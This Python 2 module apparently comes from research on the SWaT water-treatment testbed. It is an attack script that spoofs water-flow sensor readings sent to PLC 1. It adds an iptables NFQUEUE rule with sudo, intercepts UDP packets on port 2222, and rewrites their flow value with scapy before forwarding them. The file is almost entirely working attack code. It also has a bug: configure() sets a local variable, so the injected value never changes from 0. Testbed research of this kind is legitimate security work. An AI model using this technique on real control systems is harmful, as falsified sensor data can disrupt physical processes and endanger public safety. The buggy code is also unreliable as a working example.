#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to inject a constant bias in the water flow in PLC 1.
"""
from __future__ import print_function, division

import os
from netfilterqueue import NetfilterQueue

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from swat.plc1 import SWAT_P1_RIO_AI
from swat.scaling import signal_to_current, P1Flow

# Parameters list
_flow = 0
sflow = 0


def __inject(packet):
    pkt = IP(packet.get_payload())
    if SWAT_P1_RIO_AI in pkt:
        pkt[SWAT_P1_RIO_AI].flow = _flow
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    try:
        print("[*] starting water flow spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping water flow spoofing")
        nfqueue.unbind()


def configure():
    global sflow, _flow
    sflow = input('Set level (m^2/h): ')
    flow = signal_to_current(sflow, P1Flow)
    params()


def params():
    print('Flow: {} m^2/h ({})'.format(sflow, _flow))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')
